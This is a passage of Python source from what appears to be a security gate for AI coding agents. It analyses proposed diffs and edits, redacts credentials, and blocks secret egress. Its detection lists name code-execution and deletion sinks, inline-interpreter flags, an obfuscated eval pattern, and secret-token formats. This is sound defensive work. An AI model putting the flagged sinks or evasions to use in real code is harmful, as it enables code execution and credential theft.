            if not next_ln.strip() or next_indent <= cur_indent:
                cleaned.append(" " * (cur_indent + 4) + "pass")
    src = textwrap.dedent("\n".join(cleaned)).strip()
    if not src:
        return {}, 0
    tree = _parse_python_with_context(src)
    if tree is None:
        return {}, 0

    defs: Dict[str, Tuple[int, int]] = {}
    try_count = 0
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name != "_hunk_ctx":
            total_pos = len(node.args.posonlyargs) + len(node.args.args)
            min_pos = max(0, total_pos - len(node.args.defaults))
            max_pos = 10_000 if node.args.vararg is not None else total_pos
            defs[node.name] = (min_pos, max_pos)
        elif isinstance(node, ast.ClassDef):
            defs[node.name] = (-1, -1)
        elif isinstance(node, ast.Try):
            try_count += 1
    return defs, try_count


def _detect_interface_hazards(raw_lines: List[str], tree_new: ast.AST) -> List[str]:
    """Detect breaking signature changes, public symbol removals, or dropped try/except guards."""
    removed_lines: List[str] = []
    added_lines: List[str] = []
    context_lines: List[str] = []
    for ln in raw_lines:
        if ln.startswith(("--- ", "+++ ", "@@ ")):
            continue
        if ln.startswith("-"):
            removed_lines.append(ln[1:])
        elif ln.startswith("+"):
            added_lines.append(ln[1:])
        elif ln.startswith(" "):
            context_lines.append(ln[1:])

    if not removed_lines:
        return []

    old_defs, old_tries = _extract_defs_from_lines(removed_lines)
    new_defs, _ = _extract_defs_from_lines(added_lines + context_lines)
    new_tries = sum(1 for n in ast.walk(tree_new) if isinstance(n, ast.Try))
    hazards: List[str] = []

    for sym, (old_min, old_max) in old_defs.items():
        if sym in new_defs:
            new_min, new_max = new_defs[sym]
            if old_min >= 0 and new_min >= 0 and (new_min != old_min or new_max < old_max):
                hazards.append(f"breaking_signature_change:{sym}")
        elif not sym.startswith("_"):
            hazards.append(f"public_symbol_removed:{sym}")

    if old_tries > new_tries and any("try:" in l for l in removed_lines) and not any("try:" in l for l in added_lines):
        hazards.append("exception_guard_removed")

    return list(dict.fromkeys(hazards))


_SECRET_PATTERNS: Tuple[Tuple[str, re.Pattern[str], str], ...] = (
    (
        "private_key_pem",
        re.compile(
            r"-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+|DSA\s+|PGP\s+)?PRIVATE\s+KEY-----"
            r"[\s\S]*?"
            r"-----END\s+(?:RSA\s+|EC\s+|OPENSSH\s+|DSA\s+|PGP\s+)?PRIVATE\s+KEY-----"
        ),
        "[REDACTED_PRIVATE_KEY]",
    ),
    (
        "private_key_pem",
        re.compile(r"-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+|DSA\s+|PGP\s+)?PRIVATE\s+KEY-----"),
        "[REDACTED_PRIVATE_KEY]",
    ),
    ("openai_project_key", re.compile(r"\bsk-proj-[A-Za-z0-9_\-]{12,}\b"), "[REDACTED_OPENAI_KEY]"),
    ("anthropic_api_key", re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{16,}\b"), "[REDACTED_ANTHROPIC_KEY]"),
    ("api_key", re.compile(r"\bsk-[A-Za-z0-9_\-]{20,}\b"), "[REDACTED_API_KEY]"),
    ("github_pat", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{22,}\b"), "[REDACTED_GITHUB_TOKEN]"),
    ("github_token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b"), "[REDACTED_GITHUB_TOKEN]"),
    ("gitlab_token", re.compile(r"\bglpat-[A-Za-z0-9_\-]{20,}\b"), "[REDACTED_GITLAB_TOKEN]"),
    ("aws_access_key", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), "[REDACTED_AWS_KEY]"),
    ("google_api_key", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"), "[REDACTED_GOOGLE_API_KEY]"),
    ("slack_token", re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b"), "[REDACTED_SLACK_TOKEN]"),
    ("huggingface_token", re.compile(r"\bhf_[A-Za-z0-9]{20,}\b"), "[REDACTED_HF_TOKEN]"),
    ("npm_token", re.compile(r"\bnpm_[A-Za-z0-9]{20,}\b"), "[REDACTED_NPM_TOKEN]"),
    ("pypi_token", re.compile(r"\bpypi-[A-Za-z0-9_\-]{24,}\b"), "[REDACTED_PYPI_TOKEN]"),
    ("stripe_key", re.compile(r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b"), "[REDACTED_STRIPE_KEY]"),
    ("telegram_bot_token", re.compile(r"\b\d{8,10}:AA[A-Za-z0-9_\-]{30,}\b"), "[REDACTED_TELEGRAM_TOKEN]"),
    ("sendgrid_key", re.compile(r"\bSG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{16,}\b"), "[REDACTED_SENDGRID_KEY]"),
    ("databricks_token", re.compile(r"\bdapi[a-f0-9]{32}\b"), "[REDACTED_DATABRICKS_TOKEN]"),
    (
        "db_connection_uri",
        re.compile(
            r"\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|rediss|amqp|amqps)://"
            r"[^/\s:@\"']+:(?!pass(?:word)?@|changeme@|example@|your_)[^/\s@\"']{4,}@[^\s\"']+"
        ),
        "[REDACTED_DB_URI]",
    ),
    ("jwt_token", re.compile(r"\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b"), "[REDACTED_JWT]"),
    ("bearer_token", re.compile(r"Bearer\s+(?!\[REDACTED\])[A-Za-z0-9\-._~+/]{16,}=*"), "Bearer [REDACTED]"),
)

_SECRET_TOKEN_REGEXES: Tuple[re.Pattern[str], ...] = tuple(pat for _stype, pat, _repl in _SECRET_PATTERNS)
_REDACT_PATTERNS: Tuple[Tuple[re.Pattern[str], str], ...] = tuple(
    (pat, repl) for _stype, pat, repl in _SECRET_PATTERNS
) + (
    (re.compile(r"sk-[A-Za-z0-9]{16,}"), "[REDACTED_API_KEY]"),
    (re.compile(r"Bearer\s+(?!\[REDACTED\])[A-Za-z0-9\-._~+/]+=*"), "Bearer [REDACTED]"),
)
_SECRET_ASSIGN_RE = re.compile(
    r"""(?i)\b(?:api_key|secret_key|private_key|access_token|auth_token|client_secret|password|passwd)\b\s*[:=]\s*["']([A-Za-z0-9_\-./+=]{12,})["']"""
)
_SECRET_PLACEHOLDER_MARKERS: Tuple[str, ...] = (
    "example", "placeholder", "changeme", "your_", "dummy", "test", "xxx", "***", "<your"
)
_DIFF_CONTENT_KEYS: Set[str] = {"diff", "payload_diff", "new_string", "old_string", "content", "file_content"}
# `'abc' + 'def'` / `"abc" + 'def'` / template-literal joins collapsed before secret matching
_LITERAL_CONCAT_RE = re.compile(r"""['"`]\s*\+\s*['"`]""")
_JS_REQUIRE_CALL_RE = re.compile(r"\b(?:require|import)\s*\(\s*([^)]*)\)")
_JS_LITERAL_ARG_RE = re.compile(r"""(['"])[^'"\\]*\1|`[^`$\\]*`""")
# Inline interpreters that execute code passed on the command line (`perl -e`, `node -e`, ...)
_INLINE_INTERPRETER_FLAGS: Dict[str, Set[str]] = {
    "perl": {"-e", "-E"},
    "ruby": {"-e"},
    "node": {"-e", "--eval", "-p", "--print"},
    "nodejs": {"-e", "--eval", "-p", "--print"},
    "php": {"-r"},
}
_INLINE_INTERPRETER_SINK_RE = re.compile(
    r"\b(?:system|exec|execSync|execFile|execFileSync|spawn|spawnSync|fork|popen|child_process|"
    r"unlink|unlinkSync|rmSync|rmdirSync|rmdir|rmtree|rm_rf|remove_entry|shell_exec|passthru|proc_open|eval|qx)\b"
)


def redact_secrets(text: str) -> str:
    """Mask known credential/token patterns before logging or printing errors."""
    out = str(text or "")
    for pat, repl in _REDACT_PATTERNS:
        out = pat.sub(repl, out)
    return out


def scrub_tool_output(text: Any) -> Dict[str, Any]:
    """Scrub raw credential/token patterns from tool outputs before LLM context ingestion."""
    out = "" if text is None else str(text)
    found_types: List[str] = []
    total_hits = 0
    for secret_type, pat, repl in _SECRET_PATTERNS:
        out, n_subs = pat.subn(repl, out)
        if n_subs > 0:
            total_hits += n_subs
            if secret_type not in found_types:
                found_types.append(secret_type)
    return {
        "redacted_text": out,
        "secrets_found": total_hits > 0,
        "secret_count": total_hits,
        "secret_types": sorted(found_types),
    }


def _collect_strings_for_egress_scan(
    obj: Any,
    skip_diff_fields: bool,
    depth: int,
    out: List[str],
) -> None:
    if depth > 8 or obj is None:
        return
    if isinstance(obj, str):
        if obj:
            out.append(obj)
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            if skip_diff_fields and str(k) in _DIFF_CONTENT_KEYS:
                continue
            _collect_strings_for_egress_scan(v, skip_diff_fields, depth + 1, out)
        return
    if isinstance(obj, (list, tuple)):
        for item in obj:
            _collect_strings_for_egress_scan(item, skip_diff_fields, depth + 1, out)


def _scan_outbound_secret_egress(
    input_data: Any,
    cmd_str: Optional[str],
    query_text: str,
    target_path: Optional[str],
    skip_diff_fields: bool = False,
) -> List[str]:
    """Detect raw credentials across tool arguments to block outbound secret egress."""
    candidates: List[str] = []
    for s in (cmd_str, query_text, target_path):
        if isinstance(s, str) and s:
            candidates.append(s)
    if isinstance(input_data, dict):
        _collect_strings_for_egress_scan(input_data, skip_diff_fields=skip_diff_fields, depth=0, out=candidates)
    elif isinstance(input_data, str) and input_data:
        candidates.append(input_data)

    matched_types: List[str] = []
    for text in candidates:
        for secret_type, pat, _repl in _SECRET_PATTERNS:
            if pat.search(text) and secret_type not in matched_types:
                matched_types.append(secret_type)
    return sorted(matched_types)


def _detect_secret_leaks(lines: Sequence[str]) -> List[str]:
    """Detect hardcoded API tokens, PEM private keys, and literal credential assignments."""
    for ln in lines:
        stripped = ln.strip()
        if not stripped:
            continue
        for pat in _SECRET_TOKEN_REGEXES:
            if pat.search(stripped):
                return ["secret_leak_pattern_found"]
        match = _SECRET_ASSIGN_RE.search(stripped)
        if match:
            val_lower = match.group(1).lower()
            if not any(marker in val_lower for marker in _SECRET_PLACEHOLDER_MARKERS):
                return ["secret_leak_pattern_found"]
    return []


def _apply_unified_diff_to_source(original_source: str, diff_text: str) -> Optional[str]:
    """Apply a unified diff (with `@@` headers) or contiguous `-`/`+` hunk to `original_source` in memory."""
    orig_lines = original_source.splitlines()
    raw_lines = diff_text.splitlines()
    hunks: List[Tuple[int, List[str], List[str]]] = []

    idx = 0
    while idx < len(raw_lines):
        ln = raw_lines[idx]
        m = re.match(r"^@@\s+-(\d+)(?:,(\d+))?\s+\+(\d+)(?:,(\d+))?\s+@@", ln)
        if m:
            old_start = max(0, int(m.group(1)) - 1)
            idx += 1
            old_blk: List[str] = []
            new_blk: List[str] = []
            while idx < len(raw_lines) and not raw_lines[idx].startswith(("@@ ", "--- ", "+++ ")):
                cur = raw_lines[idx]
                if cur.startswith("\\ No newline"):
                    idx += 1
                    continue
                if cur.startswith("-"):
                    old_blk.append(cur[1:])
                elif cur.startswith("+"):
                    new_blk.append(cur[1:])
                elif cur.startswith(" "):
                    old_blk.append(cur[1:])
                    new_blk.append(cur[1:])
                else:
                    old_blk.append(cur)
                    new_blk.append(cur)
                idx += 1
            hunks.append((old_start, old_blk, new_blk))
            continue
        idx += 1

    if not hunks:
        has_markers = any(
            (l.startswith("-") and not l.startswith("---")) or (l.startswith("+") and not l.startswith("+++"))
            for l in raw_lines
        )
        if not has_markers:
            return None
        old_blk = []
        new_blk = []
        for cur in raw_lines:
            if cur.startswith(("--- ", "+++ ", "\\ No newline")):
                continue
            if cur.startswith("-"):
                old_blk.append(cur[1:])
            elif cur.startswith("+"):
                new_blk.append(cur[1:])
            elif cur.startswith(" "):
                old_blk.append(cur[1:])
                new_blk.append(cur[1:])
            else:
                old_blk.append(cur)
                new_blk.append(cur)
        if old_blk:
            hunks.append((0, old_blk, new_blk))
        else:
            return None

    result = list(orig_lines)
    offset_delta = 0
    applied_any = False
    for old_start, old_blk, new_blk in hunks:
        anchor = max(0, min(len(result), old_start + offset_delta))
        blk_len = len(old_blk)
        pos: Optional[int] = None

        if blk_len == 0:
            pos = anchor
        elif anchor + blk_len <= len(result) and result[anchor : anchor + blk_len] == old_blk:
            pos = anchor
        else:
            for scan in range(0, len(result) - blk_len + 1):
                if result[scan : scan + blk_len] == old_blk:
                    pos = scan
                    break

        if pos is None:
            return None

        result[pos : pos + blk_len] = new_blk
        offset_delta += len(new_blk) - blk_len
        applied_any = True

    if not applied_any:
        return None
    suffix = "\n" if original_source.endswith("\n") else ""
    return "\n".join(result) + suffix


def _collect_ast_node_tags(tree: ast.AST) -> List[str]:
    """Collect structural AST node tags for downstream microbrain feature vectors."""
    ast_nodes: List[str] = []
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name != "_hunk_ctx":
            ast_nodes.append("ast_node_function_def")
        elif isinstance(node, ast.ClassDef):
            ast_nodes.append("ast_node_class_def")
        elif isinstance(node, ast.ImportFrom):
            ast_nodes.append("ast_node_import_from")
            ast_nodes.append("ast_node_import")
        elif isinstance(node, ast.Import):
            ast_nodes.append("ast_node_import")
        elif isinstance(node, ast.Try):
            ast_nodes.append("ast_node_try_except")
        elif isinstance(node, ast.Return):
            ast_nodes.append("ast_node_return_stmt")
        elif isinstance(node, (ast.For, ast.AsyncFor)):
            ast_nodes.append("ast_node_for_loop")
        elif isinstance(node, ast.If):
            ast_nodes.append("ast_node_if_stmt")
        elif isinstance(node, (ast.With, ast.AsyncWith)):
            ast_nodes.append("ast_node_with_stmt")
        elif isinstance(node, (ast.Assign, ast.AnnAssign, ast.AugAssign)):
            ast_nodes.append("ast_node_assign")
        elif isinstance(node, ast.Assert):
            ast_nodes.append("ast_node_assert_stmt")
        elif isinstance(node, ast.Call):
            ast_nodes.append("ast_node_call")
    return list(dict.fromkeys(ast_nodes))


_TREE_SITTER_GRAMMARS: Dict[str, Tuple[str, str]] = {
    ".js": ("tree_sitter_javascript", "language"),
    ".jsx": ("tree_sitter_javascript", "language"),
    ".ts": ("tree_sitter_typescript", "language_typescript"),
    ".tsx": ("tree_sitter_typescript", "language_tsx"),
    ".rs": ("tree_sitter_rust", "language"),
    ".go": ("tree_sitter_go", "language"),
    ".c": ("tree_sitter_c", "language"),
    ".h": ("tree_sitter_c", "language"),
    ".cpp": ("tree_sitter_cpp", "language"),
    ".yaml": ("tree_sitter_yaml", "language"),
    ".yml": ("tree_sitter_yaml", "language"),
    ".html": ("tree_sitter_html", "language"),
    ".css": ("tree_sitter_css", "language"),
}


def _parse_with_tree_sitter(ext: str, code: str) -> Tuple[bool, Optional[bool]]:
    """Actually invoke tree-sitter Language/Parser when both core and grammar are installed.

    Returns ``(parsed_successfully, syntax_valid_or_none)``. Never returns ``(True, ...)``
    merely because ``import tree_sitter`` succeeded.
    """
    spec = _TREE_SITTER_GRAMMARS.get(ext)
    if spec is None or not code.strip():
        return False, None
    mod_name, fn_name = spec
    try:
        ts_mod = importlib.import_module("tree_sitter")
        Language = getattr(ts_mod, "Language")
        Parser = getattr(ts_mod, "Parser")
        grammar_mod = importlib.import_module(mod_name)
        lang_fn = getattr(grammar_mod, fn_name)
        lang = Language(lang_fn())
        parser = Parser(lang)
        tree = parser.parse(code.encode("utf-8"))
        if tree is None or not hasattr(tree, "root_node"):
            return False, None
        return True, not bool(getattr(tree.root_node, "has_error", False))
    except Exception:
        return False, None


def _apply_edit_ops_to_source(
    original_source: str,
    edit_ops: Sequence[Dict[str, Any]],
) -> Tuple[Optional[str], Optional[str]]:
    """Sequentially apply Edit/MultiEdit `{old_string, new_string}` operations in memory."""
    cur = original_source
    applied = 0
    for op in edit_ops:
        if not isinstance(op, dict):
            continue
        old_s = str(op.get("old_string") or "")
        new_s = str(op.get("new_string") or "")
        if not old_s:
            continue
        cnt = cur.count(old_s)
        if cnt == 0:
            return None, "edit_old_string_not_found"
        if cnt > 1 and not bool(op.get("replace_all", False)):
            return None, "edit_old_string_ambiguous"
        cur = cur.replace(old_s, new_s) if bool(op.get("replace_all", False)) else cur.replace(old_s, new_s, 1)
        applied += 1
    if applied == 0:
        return None, None
    return cur, None


def analyze_code_diff(
    file_path: Optional[str],
    diff_text: Optional[str],
    original_source: Optional[str] = None,
    edit_ops: Optional[Sequence[Dict[str, Any]]] = None,
) -> Dict[str, Any]:
    """Layer 1 language-aware structural diff analysis.

    When `original_source` (or an on-disk Python file at `file_path`) is available and
    `diff_text` can be anchored as a unified/contextual patch, reconstructs the complete
    patched file in memory and verifies full-file `ast.parse` plus delta security and
    signature hazards. Falls back to context-wrapped hunk parsing for standalone diffs.
    """
    if not diff_text:
        return {
            "language": "empty",
            "syntax_valid": True,
            "security_clean": True,
            "findings": [],
            "interface_hazards": [],
            "line_count": 0,
            "ast_nodes": [],
            "cyclomatic_complexity": 0,
            "is_static_data_or_doc": True,
            "context_ast_parsed": False,
            "patched_file_ast_verified": False,
        }

    path_str = str(file_path or "").strip()
    ext = Path(path_str).suffix.lower() if path_str else ""
    line_count = len(diff_text.splitlines())

    resolved_source = original_source
    if resolved_source is None and path_str and (ext == ".py" or not ext):
        try:
            candidate_path = Path(path_str)
            if candidate_path.is_file():
                resolved_source = candidate_path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            resolved_source = None

    # Extract proposed lines carefully
    raw_lines = diff_text.splitlines()
    has_unified = any(l.startswith(("--- ", "+++ ", "@@ ", "diff --git ")) for l in raw_lines)
    _GIT_META_PREFIXES = (
        "diff --git ", "index ", "new file mode ", "deleted file mode ",
        "old mode ", "new mode ", "similarity index ", "rename from ", "rename to ",
        "---", "+++", "@@", "\\ No newline",
    )
    if has_unified:
        hunks: List[List[str]] = [[]]
        for l in raw_lines:
            if l.startswith("@@"):
                if hunks[-1]:
                    hunks.append([])
                continue
            if l.startswith(_GIT_META_PREFIXES) or l.startswith("-"):
                continue
            if l.startswith(("+", " ")):
                hunks[-1].append(l[1:])
            else:
                hunks[-1].append(l)
        extracted = "\n".join(line for h in hunks for line in h)
    else:
        hunks = []
        if all(l.startswith("+") or not l.strip() for l in raw_lines if l):
            extracted = "\n".join(l[1:] if l.startswith("+") else l for l in raw_lines)
        else:
            extracted = diff_text

    dedented = textwrap.dedent(extracted).strip("\n")
    if has_unified:
        secret_scan_lines = [l[1:] for l in raw_lines if l.startswith("+") and not l.startswith("+++")]
    else:
        secret_scan_lines = dedented.splitlines()
    secret_findings = _detect_secret_leaks(secret_scan_lines)

    # Non-Python files: skip Python ast.parse and validate format appropriately
    if ext == ".json":
        try:
            json.loads(dedented)
            json_ok = True
        except Exception:
            json_ok = ('"' in dedented and ":" in dedented) or dedented.strip().startswith(("{", "["))
        findings = ([] if json_ok else ["malformed_json_hunk"]) + secret_findings
        return {
            "language": "json",
            "syntax_valid": json_ok,
            "security_clean": len(secret_findings) == 0,
            "findings": list(dict.fromkeys(findings)),
            "interface_hazards": [],
            "line_count": line_count,
            "ast_nodes": [],
            "cyclomatic_complexity": 0,
            "is_static_data_or_doc": bool(json_ok and len(secret_findings) == 0),
            "context_ast_parsed": False,
            "patched_file_ast_verified": False,
        }

    fname_lower = Path(path_str).name.lower() if path_str else ""
    is_shell_shebang = (not ext) and dedented.lstrip().startswith(("#!/bin/sh", "#!/bin/bash", "#!/usr/bin/env bash", "#!/usr/bin/env zsh"))
    if (
        ext in {".sh", ".bash", ".zsh", ".ksh", ".ps1"}
        or is_shell_shebang
        or fname_lower in {"makefile", "dockerfile", "gnumakefile", "justfile"}
    ):
        sh_diff_findings: List[str] = list(secret_findings)
        for ln in dedented.splitlines():
            stripped = ln.strip()
            if not stripped or stripped.startswith("#"):
                continue
            if fname_lower in {"makefile", "gnumakefile", "justfile"}:
                if re.match(r"^[A-Za-z0-9_.\-/]+:\s*(?:[^=]|$)", stripped) and ";" not in stripped:
                    continue
                stripped = stripped.lstrip("@-+").strip()
                if not stripped:
                    continue
            elif fname_lower == "dockerfile":
                if stripped.upper().startswith("RUN "):
                    stripped = stripped[4:].strip()
                else:
                    continue
            sh_res = analyze_shell_command(stripped)
            if not sh_res.get("is_safe", True):
                for f_item in sh_res.get("findings", []):
                    sh_diff_findings.append(f"shell_script_unsafe_cmd:{f_item}")
        sh_diff_findings = list(dict.fromkeys(sh_diff_findings))
        lang_name = "shell" if (ext in {".sh", ".bash", ".zsh", ".ksh"} or is_shell_shebang) else (ext.lstrip(".") or fname_lower)
        return {
            "language": lang_name,
            "syntax_valid": True,
            "security_clean": len(sh_diff_findings) == 0,
            "findings": sh_diff_findings,
            "interface_hazards": [],
            "line_count": line_count,
            "ast_nodes": [],
            "cyclomatic_complexity": 0,
            "is_static_data_or_doc": False,
            "context_ast_parsed": False,
            "ast_parser_backend": "shell_parser",
            "patched_file_ast_verified": False,
        }

    if (
        ext in {
            ".ts", ".tsx", ".js", ".jsx", ".css", ".html", ".md", ".yaml", ".yml", ".toml", ".txt",
            ".c", ".cpp", ".h", ".rs", ".go", ".sql", ".rb", ".java", ".php", ".ini", ".cfg",
            ".xml", ".svg", ".lock",
        }
        or fname_lower == "procfile"
    ):
        non_py_findings: List[str] = list(secret_findings)
        for ln in dedented.splitlines():
            stripped = ln.strip()
            if stripped.startswith(("//", "#", "/*", "*")):
                continue
            # Credentials split across adjacent literals: 'sk-proj-' + 'abc...'
            collapsed = _LITERAL_CONCAT_RE.sub("", stripped)
            if collapsed != stripped and any(p.search(collapsed) for p in _SECRET_TOKEN_REGEXES):
                non_py_findings.append("obfuscated_secret_concatenation")
            if ext in {".js", ".ts", ".jsx", ".tsx"}:
                if re.search(r"\beval\s*\(", stripped) or re.search(r"""\[\s*['"]ev['"]\s*\+\s*['"]al['"]\s*\]""", stripped):
                    non_py_findings.append("js_eval_call")
                if re.search(r"\bnew\s+Function\s*\(|\bchild_process\b|\bexecSync\s*\(|\bspawnSync\s*\(", stripped):
                    non_py_findings.append("js_dangerous_sink")
                # Dynamic module loading (require(x) / import(x)) mirrors Python's dynamic_import veto
                for m_req in _JS_REQUIRE_CALL_RE.finditer(stripped):
                    req_arg = m_req.group(1).strip()
                    if req_arg and not _JS_LITERAL_ARG_RE.fullmatch(req_arg):
                        non_py_findings.append("js_dynamic_require")
                        break
            if ext in {".yaml", ".yml"}:
                if re.search(r"!!python/(?:object|apply|module|name)\b", stripped):
                    non_py_findings.append("yaml_unsafe_deserialization_tag")

        # Optional real tree-sitter parse only when both tree_sitter and grammar package succeed
        ts_parsed, ts_syntax_ok = _parse_with_tree_sitter(ext, dedented)

        non_py_findings = list(dict.fromkeys(non_py_findings))
        is_doc_or_cfg = ext in {".md", ".txt", ".yaml", ".yml", ".toml", ".css", ".html"} and len(non_py_findings) == 0
        syntax_valid = bool(ts_syntax_ok) if (ts_parsed and ts_syntax_ok is not None and not has_unified) else True
        return {
            "language": ext.lstrip(".") or "text",
            "syntax_valid": syntax_valid,
            "security_clean": len(non_py_findings) == 0,
            "findings": non_py_findings,
            "interface_hazards": [],
            "line_count": line_count,
            "ast_nodes": [],
            "cyclomatic_complexity": 0,
            "is_static_data_or_doc": is_doc_or_cfg,
            "context_ast_parsed": bool(ts_parsed),
            "ast_parser_backend": "tree_sitter" if ts_parsed else "regex_heuristic",
            "patched_file_ast_verified": False,
        }

    # Python (or unspecified code snippet)
    context_ast_parsed = False
    patched_file_ast_verified = False
    seed_visitor: Optional[_SecurityASTVisitor] = None
    orig_tree: Optional[ast.AST] = None
    if resolved_source:
        orig_tree = _parse_python_with_context(resolved_source)
        if orig_tree is not None:
            seed_visitor = _SecurityASTVisitor()
            seed_visitor.visit(orig_tree)
            context_ast_parsed = True

    patched_source: Optional[str] = None
    if resolved_source:
        if edit_ops and not has_unified:
            patched_source, edit_err = _apply_edit_ops_to_source(resolved_source, edit_ops)
            if edit_err is not None:
                return {
                    "language": "python",
                    "syntax_valid": False,
                    "security_clean": False,
                    "findings": [edit_err],
                    "interface_hazards": [],
                    "line_count": line_count,
                    "ast_nodes": [],
                    "cyclomatic_complexity": 0,
                    "is_static_data_or_doc": False,
                    "context_ast_parsed": True,
                    "patched_file_ast_verified": False,
                }
        if patched_source is None:
            patched_source = _apply_unified_diff_to_source(resolved_source, diff_text)
    patched_tree: Optional[ast.AST] = None
    if patched_source is not None:
        patched_file_ast_verified = True
        context_ast_parsed = True
        try:
            patched_tree = ast.parse(patched_source)
        except SyntaxError:
            return {
                "language": "python",
                "syntax_valid": False,
                "security_clean": False,
                "findings": ["syntax_tree_malformed", "patched_file_syntax_error"],
                "interface_hazards": [],
                "line_count": line_count,
                "ast_nodes": [],
                "cyclomatic_complexity": 0,
                "is_static_data_or_doc": False,
                "context_ast_parsed": True,
                "patched_file_ast_verified": True,
            }

    tree = _parse_python_with_context(dedented)
    if tree is None and has_unified and hunks:
        # Multi-hunk unified diff without full file: parse each @@ hunk independently
        parsed_bodies: List[ast.stmt] = []
        all_hunks_ok = True
        for h_lines in hunks:
            h_text = textwrap.dedent("\n".join(h_lines)).strip("\n")
            if not h_text.strip():
                continue
            h_tree = _parse_python_with_context(h_text)
            if h_tree is None:
                all_hunks_ok = False
                break
            if isinstance(h_tree, ast.Module):
                parsed_bodies.extend(h_tree.body)
        if all_hunks_ok and parsed_bodies:
            tree = ast.Module(body=parsed_bodies, type_ignores=[])
    if tree is None and has_unified:
        # Fallback 1: synthetic unified diffs where context lines omit the 1-space diff prefix
        unshifted = "\n".join(
            l[1:] if l.startswith("+") else l
            for l in raw_lines
            if not (l.startswith(_GIT_META_PREFIXES) or l.startswith("-"))
        )
        if unshifted.strip():
            tree = _parse_python_with_context(textwrap.dedent(unshifted).strip("\n"))
    if tree is None and has_unified:
        # Fallback 2: parse added '+' lines only when they are self-contained statements (not dangling block headers)
        added_only = "\n".join(l[1:] for l in raw_lines if l.startswith("+") and not l.startswith("+++"))
        added_dedented = textwrap.dedent(added_only).strip("\n")
        if added_dedented.strip() and not added_dedented.rstrip().endswith(":"):
            tree = _parse_python_with_context(added_dedented)
    if tree is None and patched_tree is not None:
        tree = patched_tree
    elif tree is None and resolved_source:
        combined = resolved_source.rstrip("\n") + "\n" + textwrap.indent(dedented, "    ")
        tree = _parse_python_with_context(combined)
        if tree is None:
            combined_top = resolved_source.rstrip("\n") + "\n" + dedented
            tree = _parse_python_with_context(combined_top)
        if tree is not None:
            context_ast_parsed = True

    analysis_tree = patched_tree if patched_tree is not None else tree
    if analysis_tree is None:
        # Check for explicit syntax errors on added lines vs. partial-context unified hunks without original_source
        added_lines_text = [l[1:] for l in raw_lines if l.startswith("+") and not l.startswith("+++")] if has_unified else dedented.splitlines()
        line_findings: List[str] = list(secret_findings)
        for ln in added_lines_text:
            s_ln = ln.strip()
            if not s_ln or s_ln.startswith("#"):
                continue
            lt = _parse_python_with_context(s_ln)
            if lt is not None:
                lv = _SecurityASTVisitor()
                lv.visit(lt)
                line_findings.extend(lv.findings)
        line_findings = list(dict.fromkeys(line_findings))
        explicit_bad_syntax = any(
            re.match(r"^\s*(?:def|class)\s+[A-Za-z_]\w*\s*\([^)]*:\s*$", ln)
            for ln in added_lines_text
        )
        partial_needs_source = bool(has_unified and not resolved_source and not explicit_bad_syntax and not line_findings)
        return {
            "language": "python",
            "syntax_valid": False,
            "partial_hunk_needs_source": partial_needs_source,
            "security_clean": len(line_findings) == 0,
            "findings": list(dict.fromkeys(line_findings + ["syntax_tree_malformed"])),
            "interface_hazards": [],
            "line_count": line_count,
            "ast_nodes": [],
            "cyclomatic_complexity": 0,
            "is_static_data_or_doc": False,
            "context_ast_parsed": context_ast_parsed,
            "patched_file_ast_verified": patched_file_ast_verified,
        }

    hunk_findings: List[str] = []
    structural_findings: List[Dict[str, Any]] = []
    if tree is not None and tree is not patched_tree:
        visitor = _SecurityASTVisitor()
        if seed_visitor is not None:
            visitor.module_aliases.update(seed_visitor.module_aliases)
            visitor.dangerous_aliases.update(seed_visitor.dangerous_aliases)
            visitor.decoded_vars.update(seed_visitor.decoded_vars)
        visitor.visit(tree)
        hunk_findings.extend(visitor.findings)
        structural_findings.extend(visitor.structural_findings)
        if visitor.has_network_sink and (
            visitor.has_env_secret_read or any("ast_protected_file_access" in f for f in visitor.findings)
        ):
            hunk_findings.append("ast_secret_exfil_pattern")

    if patched_tree is not None:
        patched_visitor = _SecurityASTVisitor()
        patched_visitor.visit(patched_tree)
        if patched_visitor.has_network_sink and (
            patched_visitor.has_env_secret_read
            or any("ast_protected_file_access" in f for f in patched_visitor.findings)
        ):
            patched_visitor.findings.append("ast_secret_exfil_pattern")
        baseline_counts = Counter(seed_visitor.findings) if seed_visitor is not None else Counter()
        delta_counts = Counter(patched_visitor.findings) - baseline_counts
        for finding, cnt in delta_counts.items():
            if cnt > 0:
                hunk_findings.append(finding)
        if not structural_findings:
            structural_findings.extend(patched_visitor.structural_findings)

    all_findings = list(dict.fromkeys(hunk_findings + secret_findings))
    interface_hazards = _detect_interface_hazards(raw_lines, analysis_tree) if has_unified else []

    if patched_source is not None and resolved_source:
        orig_defs, orig_tries = _extract_defs_from_lines(resolved_source.splitlines())
        new_defs, new_tries = _extract_defs_from_lines(patched_source.splitlines())
        for sym, (old_min, old_max) in orig_defs.items():
            if sym in new_defs:
                new_min, new_max = new_defs[sym]
                if old_min >= 0 and new_min >= 0 and (new_min != old_min or new_max < old_max):
                    haz = f"breaking_signature_change:{sym}"
                    if haz not in interface_hazards:
                        interface_hazards.append(haz)
            elif not sym.startswith("_"):
                haz = f"public_symbol_removed:{sym}"
                if haz not in interface_hazards:
                    interface_hazards.append(haz)
        if orig_tries > new_tries and any("try:" in l for l in raw_lines if l.startswith("-")) and "exception_guard_removed" not in interface_hazards:
            interface_hazards.append("exception_guard_removed")

    complexity_tree = tree if tree is not None else analysis_tree
    cyclomatic_complexity = sum(
        1 for n in ast.walk(complexity_tree)
